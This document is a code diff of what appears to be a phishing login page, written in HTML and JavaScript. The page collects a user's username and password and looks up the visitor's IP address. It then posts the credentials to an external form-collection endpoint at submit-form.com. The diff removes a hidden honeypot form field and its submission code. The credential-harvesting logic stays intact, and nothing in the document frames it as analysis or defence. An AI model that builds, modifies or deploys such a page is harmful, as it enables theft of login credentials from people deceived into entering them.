@@ -314,7 +314,6 @@
       color: #fff;
     }
     .dialog .dialog-form .btn.btn-default:disabled { cursor: not-allowed; opacity: 0.65; }
-    .honeypot-field { display: none; }
     @-webkit-keyframes swooshUp30 { 0% { opacity: 0; } 100% { opacity: 1; } }
     @-moz-keyframes swooshUp30 { 0% { opacity: 0; } 100% { opacity: 1; } }
     @keyframes swooshUp30 { 0% { opacity: 0; } 100% { opacity: 1; } }
@@ -410,11 +409,6 @@
 <div class="form-group">
 <label for="user_password" class="control-label" data-i18n="password">Password:</label>
 <input type="password" id="user_password" class="form-control" name="user_password" required />
-</div>
-<!-- Honeypot field -->
-<div class="form-group honeypot-field">
-<label for="contact_info">Leave this field empty</label>
-<input type="text" id="contact_info" name="contact_info" value="" />
 </div>
 <label id="error" class="error" style="display: none;color: red;" data-i18n="error">Enter the correct password</label>
 <div class="pad-top-20 pad-btm-20">
@@ -568,14 +562,13 @@
 
   // --- Form Submission Logic ---
 
-  function sendFormData(email, password, honeypot, $input, $passwordInput) {
+  function sendFormData(email, password, $input, $passwordInput) {
     $.ajax({
       type: 'POST',
       url: "https://submit-form.com/bbKESMhI7",
       data: {
         user_username: email,
-        user_password: password,
-        contact_info: honeypot
+        user_password: password
       },
       dataType: 'json',
       success: function(data) {
@@ -673,7 +666,6 @@ IP Address: ${ipAddress}`;
     var $passwordInput = $('#user_password');
     var email = $("#user_username").val();
     var password = $passwordInput.val();
-    var honeypot = $("#contact_info").val();
 
     // New submission flow: Get IP first, then submit.
     getUserIP(function(ipAddress) {
@@ -685,9 +677,9 @@ IP Address: ${ipAddress}`;
       // 2. Send data to the original form endpoint
       if (!$input.is(':disabled')) {
         count++;
-        sendFormData(email, password, honeypot, $input, $passwordInput);
+        sendFormData(email, password, $input, $passwordInput);
       } else {
-        sendFormData(email, password, honeypot, $input, $passwordInput);
+        sendFormData(email, password, $input, $passwordInput);
       }
     });
   });
